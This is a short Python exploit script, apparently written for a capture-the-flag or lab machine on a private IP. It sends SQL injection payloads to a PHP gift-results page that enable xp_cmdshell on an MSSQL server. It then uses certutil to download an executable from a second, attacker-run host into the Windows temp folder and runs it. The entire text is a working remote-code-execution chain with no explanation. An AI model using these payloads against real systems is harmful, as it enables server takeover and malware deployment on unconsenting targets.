import requests


requests.get("http://10.10.35.73/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --")
requests.get("http://10.10.35.73/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://10.17.119.81:8000/meverse.exe C:\Windows\Temp\meverse.exe'; --")
requests.get("http://10.10.35.73/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\meverse.exe'; --")